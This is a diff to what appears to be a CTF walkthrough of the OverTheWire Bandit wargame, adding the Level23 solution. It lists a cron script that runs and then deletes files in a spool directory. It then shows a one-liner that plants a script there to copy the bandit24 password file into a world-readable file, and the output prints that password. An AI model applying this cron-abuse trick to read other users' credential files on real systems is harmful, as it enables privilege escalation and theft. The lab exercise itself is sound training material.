@@ -225,7 +225,29 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 #### [+] Level23
 ```
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$ echo -e "cp /etc/bandit_pass/bandit24 lorka;chmod 777 lorka" > "/var/spool/bandit24/lala";chmod +x "/var/spool/bandit24/lala";echo -e "[+] Espera 30segundos";sleep 30;cat "/var/spool/bandit24/lorka"
+[+] Espera 30segundos
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 #### [+] Level24
 ```
